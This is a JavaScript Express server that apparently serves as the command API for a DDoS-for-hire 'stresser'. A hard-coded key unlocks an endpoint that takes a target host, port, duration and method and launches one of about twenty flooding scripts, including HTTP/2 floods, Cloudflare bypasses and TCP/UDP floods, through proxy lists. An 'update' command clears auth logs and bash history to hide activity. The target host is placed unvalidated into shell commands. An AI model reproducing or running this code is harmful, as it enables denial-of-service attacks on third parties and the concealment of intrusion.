const express = require("express")
const { exec } = require("child_process")
const os = require("os")
const app = express()
function getServerIP() {
  const networkInterfaces = os.networkInterfaces()
  for (const interfaceName in networkInterfaces) {
    const interfaces = networkInterfaces[interfaceName]
    for (const iface of interfaces) {
      if (!iface.internal && iface.family === "IPv4") {
        return iface.address
      }
    }
  }
  return "0.0.0.0"
}
const serverIP = getServerIP()
function validateInput(input) {
  const safePattern = /^[a-zA-Z0-9._-]+$/
  return safePattern.test(input)
}
app.use((req, res, next) => {
  res.setHeader("Content-Type", "application/json")
  next()
})
app.use((req, res, next) => {
  const ip = req.headers["x-forwarded-for"] || req.socket.remoteAddress
  console.log(`[${new Date().toISOString()}] Request from ${ip}: ${req.url}`)
  next()
})
app.get("/update", (req, res) => {
  const command = `cd /root/methods/ && screen -dm node proxy_scrapper.js && cd /root/methods/BROWSERN3 && screen -dm node proxy_scraper.js && truncate -s 0 /var/log/auth.log && truncate -s 0 /root/.bash_history && go clean -cache`
  exec(command, (error, stdout, stderr) => {
    if (error) {
      console.error(`Update error: ${error}`)
      return res.status(500).json({
        success: false,
        message: "Error executing update command",
      })
    }
    console.log("Update command executed successfully")
    res.json({
      success: true,
      message: "Update process started successfully",
      timestamp: new Date().toISOString(),
    })
  })
})
app.get("/refresh", (req, res) => {
    const command = `pkill screen || true`
    exec(command, (error, stdout, stderr) => {
      if (error) {
        console.error(`refres error: ${error}`)
        return res.status(500).json({
          success: false,
          message: "Error executing refresh command",
        })
      }
      console.log("refresh command executed successfully")
      res.json({
        success: true,
        message: "refresh process started successfully",
        timestamp: new Date().toISOString(),
      })
    })
  })
app.get("/", (req, res) => {
  const { host, port, time, method, key } = req.query
  if (!host || !port || !time || !method || !key) {
    return res.status(400).json({
      success: false,
      message: `Missing required parameters. Usage: http://${req.hostname}/?host=&port=&time=&method=&key=`,
    })
  }
  const allowedKeys = ["L7_EXECUTIVE-STRESSER1337"]
  if (!allowedKeys.includes(key)) {
    return res.status(403).json({
      success: false,
      message: "Invalid Key",
    })
  }
  if (!validateInput(port) || !validateInput(time) || !validateInput(method)) {
    return res.status(400).json({
      success: false,
      message: "Invalid input parameters",
    })
  }
  const timeValue = Number.parseInt(time, 10)
  if (isNaN(timeValue) || timeValue <= 0 || timeValue > 999999999999) {
    return res.status(400).json({
      success: false,
      message: "Invalid time parameter. Must be between 1-999999999999 seconds.",
    })
  }
  let command
  switch (method) {
    case "dark_executive":
      command = `(cd methods && screen -dm node h2-blast.js ${host} ${time} 8 5 proxy.txt) & 
(cd methods && screen -dm node h2-meris.js GET "${host}" "${time}" 4 64 proxy.txt --query 1 --bfm true --httpver "http/1.1" --referer %RAND% --ua "Browser18/2.0 (Device76; iOS) Engine63/16.0 (KHTML, like Gecko) Feature23/13.0" --ratelimit true) & 
(cd methods && screen -dm node tls.js GET ${host} proxy.txt ${time} 512 10) &`
     break
    case "tls":
      command = `cd methods/ && screen -dm node tls.js GET ${host} proxy.txt ${time} 512 10`
      break
    case "bypass":
      command = `cd methods/ && screen -dm node bypass.js GET "${host}" "${time}" 5 8 proxy.txt --query 1 --cookie uh=good --delay 3 --bfm true --referer rand --postdata "user=f&pass=%RAND%" --randrate`
      break
    case "mixbill":
      command = `cd methods/ && screen -dm node MixBill.js ${host} ${time} 64 5 proxy.txt`
      break
    case "cf-pro":
      command = `cd methods/ && screen -dm node cf-pro.js bypass ${time} 5 proxy.txt 32 ${host}`
      break
    case "h2-blast":
      command = `cd methods/ && screen -dm node h2-blast.js ${host} ${time} 8 5 proxy.txt`
      break
    case "h2-meris":
      command = `cd methods/ && screen -dm node h2-meris.js GET "${host}" "${time}" 4 64 proxy.txt --query 1 --bfm true --httpver "http/1.1" --referer %RAND% --ua "Browser18/2.0 (Device76; iOS) Engine63/16.0 (KHTML, like Gecko) Feature23/13.0" --ratelimit true`
      break
    case "h2-hold":
      command = `cd methods/ && screen -dm node h2-hold.js ${host} ${time} 64 8 proxy.txt`
      break
    case "browser":
      command = `cd methods/BROWSERN3/ && screen -dm node browsern.js ${host} ${time} 8 --proxy proxy.txt --headers undetect`
      break
    case "killnet":
      command = `cd methods/ && screen -dm node killnet.js ${host} ${time} 64 5 proxy.txt`
      break
    case "h1-flush":
      command = `cd methods/ && screen -dm node h1-flush.js ${host} ${time} 5 8 proxy.txt --connection 2`
      break
    case "static":
      command = `cd methods/ && screen -dm node reclopsus.js ${host} ${time} 8 2 proxy.txt`
      break
    case "h1":
      command = `cd methods/ && screen -dm node loki.js ${host} ${time} 8 5 proxy.txt`
      break
    case "h2-killer":
      command = `cd methods/ && screen -dm node H2KILLER.js ${host} ${time} 8 3 proxy.txt`
      break
    case "h3":
      command = `cd methods/ && screen -dm node h3-tls.js ${host} ${time} 4 8 proxy.txt`
      break
    case "penguin":
      command = `cd methods/ && screen -dm node penguin.js -m GET -u ${host} -s ${time} -t 4 -r 32 -p indo.txt -d true -v 1`
      break
    case "strike":
      command = `cd methods/ && screen -dm node strike.js POST ${host} ${time} 3 8 proxy.txt --debug`
      break
    case "tcp":
      command = `cd methods/ && screen -dm ./TCP ${host} ${port} 150 -1 ${time}`
      break
    case "tcp-bypass":
      command = `cd methods/ && screen -dm ./TCP-BYPASS ${host} ${port} 20 65530 ${time}`
      break
    case "udp":
      command = `cd methods/ && screen -dm ./UDP ${host} ${port} ${time}`
      break
    case "refresh":
      command = `cd methods/ && pkill screen`
      break
    case "update":
      command = `cd /root/methods/ && screen -dm node proxy_scrapper.js && cd /root/methods/BROWSERN3 && screen -dm node proxy_scraper.js && truncate -s 0 /var/log/auth.log && truncate -s 0 /root/.bash_history && go clean -cache`
      break
    default:
      return res.status(400).json({
        success: false,
        message: "Unknown method",
      })
  }
  exec(command, (error, stdout, stderr) => {
    if (error) {
      console.error(`Execution error: ${error}`)
      return res.status(500).json({
        success: false,
        message: "Error executing command",
      })
    }
    console.log(`Command executed for ${method} attack on ${host}`)
    res.json({
      success: true,
      message: `Attack Sent To ${host} using ${method} Methods`,
      data: {
        host: host,
        port: port,
        time: time,
        method: method,
        timestamp: new Date().toISOString(),
      },
    })
  })
})
app.get("/status", (req, res) => {
  res.json({
    success: true,
    status: "online",
    timestamp: new Date().toISOString(),
  })
})
app.get("/methods", (req, res) => {
  const methods = [
    "tls",
    "dark_executive",
    "bypass",
    "mixbill",
    "cf-pro",
    "h2-blast",
    "h2-meris",
    "h2-hold",
    "browser",
    "killnet",
    "h1-flush",
    "static",
    "h1",
    "h2-killer",
    "h3",
    "penguin",
    "strike",
    "tcp",
    "tcp-bypass",
    "udp",
    "refresh",
    "update",
  ]
  res.json({
    success: true,
    methods: methods,
  })
})
app.use((err, req, res, next) => {
  console.error(err.stack)
  res.status(500).json({
    success: false,
    message: "Something went wrong!",
  })
})
app.use((req, res) => {
  res.status(404).json({
    success: false,
    message: "Endpoint not found",
  })
})
app.listen(1337, serverIP, () => {
  console.log(`API berjalan di http://${serverIP}:1337`)
})
